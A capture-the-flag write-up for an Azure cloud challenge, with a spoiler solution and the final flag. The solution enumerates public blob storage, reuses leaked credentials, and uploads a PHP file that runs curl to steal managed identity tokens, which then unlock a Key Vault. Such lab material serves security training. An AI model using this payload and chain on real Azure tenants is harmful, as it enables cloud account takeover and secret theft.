# CloudMe
**Category:** Cloud

**Author:** @r3n_hat

## Description

Some secrets are stored in the Cloud.
Make sure to secure your vault.
https://gfez94skznma90za12sk93xm.blob.core.windows.net

## Rules
* Don't perform Fuzzing, port scanning or run vulnerability assessment tools.


## Solution
<details>
 <summary>Reveal Spoiler</summary>


Visit https://gfez94skznma90za12sk93xm.blob.core.windows.net
Then Import-Module MicroBurst and start AzureBlobs enumeration:

```
Import-Module .\MicroBurst.psm1

Invoke-EnumerateAzureBlobs -Base gfez94skznma90za12sk93xm
```

Then navigate to: https://gfez94skznma90za12sk93xm.blob.core.windows.net/storageaccount?restype=container&comp=list or download the txt file https://gfez94skznma90za12sk93xm.blob.core.windows.net/storageaccount/gjkdegtdfgkjnfdkgkjhdbaenhfksljdgfhkjshbgfkjsgkjfdskjhfdgf.txt

Use the credentials found on mysecrets.txt, open your browser and change your User-Agent to Android or iOS.
Then login to: https://portal.azure.com and navigate to App Service. Find and open the URL https://jduhsbjkixzeaszaxncmakalacxtrqplza449fis2zaw31mkf873dz.azurewebsites.net/

Scroll down and upload the below php file:

```
<?php 

system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');

system('curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');

system('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');

?>
```

Use the access tokens and login using Connect-AzAccount:

```
Connect-AzAccount -AccessToken $mgmtToken -GraphAccessToken $graph -KeyVaultAccessToken $keyvault -AccountId $AccountId
```

Then Read the flag from the KeyVault:

```
Get-AzKeyVaultSecret -VaultName ccsc-cft-2022-secret
Get-AzKeyVaultSecret -VaultName ccsc-cft-2022-secret -Name flag -AsPlainText | fl *

```

Flag: CCSC{Y0u_Sh0uld_N3v3r_Store_Passw0rds_In_Th3_CLOUD}

</details>
